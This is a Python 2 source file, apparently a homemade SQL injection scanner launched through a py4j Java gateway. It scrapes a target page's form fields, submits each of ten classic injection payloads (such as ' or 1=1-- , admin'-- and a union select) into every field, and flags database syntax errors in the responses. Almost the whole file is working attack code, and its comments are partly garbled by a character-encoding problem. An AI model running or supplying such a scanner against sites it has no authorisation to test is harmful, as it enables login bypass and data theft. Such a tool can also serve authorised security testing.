# -*- coding: utf-8 -*-
'''
Created on 2016. 7. 20.
@author: jhj
'''
import sys
import urllib, urllib2, cookielib
from py4j.java_gateway import JavaGateway, GatewayParameters
import mechanize


def url(url):
    
    print "url", url
    scan_header(url)
    
               
def scan_header(url):
    print url, " \nopen..."
    opener = urllib.urlopen(url)
    print "url ..."
    if opener.code == 200:
        print "url status: 200 ok"
        print "header infor....\n",opener.headers 
        test2 = form_mechanize(url)
        print test2
        req_url(url, test2)
            
    elif opener.code == 404:
        
        print "page was not found check it"
        exit()

def form_mechanize(real_url):
   
    cj = mechanize.CookieJar()
    br = mechanize.Browser()  
    br.set_cookiejar(cj)
    br.set_handle_robots(False)
    br.set_handle_equiv(True)
    br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    print "br.open...."   
    br.open(real_url)
    
    formname = []
    userTagId = []
    formSubmit = []
    for form in br.forms():
        
        formname.append(form.name)  
    
    print "-------------[*] formname list up-----------"     
    print formname
    
    for names in formname :
        if names != "None":
            test = names
    formSubmit.append(test)
    br.select_form(name=test) 
    for control in br.form.controls:
       
        if control.name != "None":    
            if control.type != "submit" :
                userTagId.append(control.name)
            else:
                formSubmit.append(control.name)
                     
    print "-------------[*] form input id list up-----------"
    print userTagId   
       
    return userTagId 

def req_url(real_url, test2):
    sqli_pattern = {'pattern1':"'or'1'='1", 'pattern2':"'or'1'='2", 'pattern3':"' or 1=1-- ",
                  'pattern4':"' or 1=1#", 'pattern5':"admin' #",
                  'pattern6':"'union select 1  limit 1, 1%23",
                  'pattern7':"'", 'pattern8':"a' or 1=1 --", 'pattern9':"')or(x'='x",
                  'pattern10':"admin'--"}
    

    plist = []
    payload = {}
    res = []
    
    for p in sqli_pattern.keys():  # sql ������ Ű ���� ���� 
        plist.append(p)  # ������ Ű ���� ������� ����
        # print "plist"
        # print plist #������ Ű���� ����Ʈ�� ���� 
    for pattern in plist:
        payload = {}
        
        for tagId in test2:
            # payload={tagId:sqli_pattern.get(pattern)}
            print tagId, sqli_pattern.get(pattern)
            # if tagId!=payload[tagId]:
            payload[tagId] = sqli_pattern.get(pattern)
        res.append(payload)
    print res    
     
    sqli_attack(real_url, res)

def sqli_attack(real_url, result):
    
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    urllib2.install_opener(opener)
    
    for re in result:
        print re
        data = urllib.urlencode(re)
           
        try:
            request = urllib2.Request(real_url, data)
            res = opener.open(request)
            print "****************************"
           
            print re, "-----------------------"
            print res.read()
            print "----------------------"
            res.close()
        except urllib2.HTTPError, error:
            # content = error.read()
            if error.getcode() == 500:
                # print "*****----------------*************"
                # print "fasdfadf\n",error.getcode
                dberror = error.read()
                errorCheck(re, dberror)
                   
                   
            # print "fasdfasdf\n",content
            
    
    
    # req = urllib2.Request(real_url,data)
def errorCheck(re, dberror):
    
    print "DBERORR\n", re, dberror
    if "Syntax error (missing operator) in query expression" in dberror:
        print "sql Injection", "1"

    
if __name__ == "__main__":
    gateway = JavaGateway()

    print "python dfsaf ......"
    print "python py4j gateway start......"
    java_url = gateway.entry_point.getwebScan()
    print "python py4j getUrl ȣ��......"

   
    url(java_url.getUrl())
       
    
    
